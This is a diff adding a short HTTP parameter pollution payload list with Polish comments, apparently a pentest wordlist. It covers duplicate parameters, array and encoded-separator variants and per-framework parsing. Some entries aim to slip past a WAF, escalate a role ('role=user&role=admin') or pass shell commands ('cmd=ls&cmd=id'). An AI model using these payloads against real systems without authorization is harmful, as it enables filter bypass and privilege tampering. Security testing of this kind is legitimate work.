@@ -1,0 +1,29 @@
+# === Same parameter, multiple values ===
+# Test, który wariant backend bierze: pierwszy / ostatni / concatenated
+?id=1&id=2
+?id=1&id=2&id=3
+?id[]=1&id[]=2
+
+# === Pollution — bypass blacklist ===
+# Pierwszy 'id' przepuszczony przez WAF, drugi exploituje
+?user=admin&user=guest
+?role=user&role=admin
+
+# === Mixed body / query ===
+# Body: id=1, query: ?id=2 — niektóre frameworki priorytetyzują
+?param=safe (POST: param=<payload>)
+
+# === Array notation differences ===
+?id[0]=1&id[1]=2
+?id.0=1&id.1=2
+
+# === Comma-separated (Spring etc.) ===
+?id=1,2,3
+
+# === Encoded separator ===
+?id=1%26id=2
+?id=1%3Bid=2
+
+# === Per-framework specific ===
+# PHP: bierze ostatni; ASP: konkatenuje przecinkiem; Node Express: array
+?cmd=ls&cmd=id
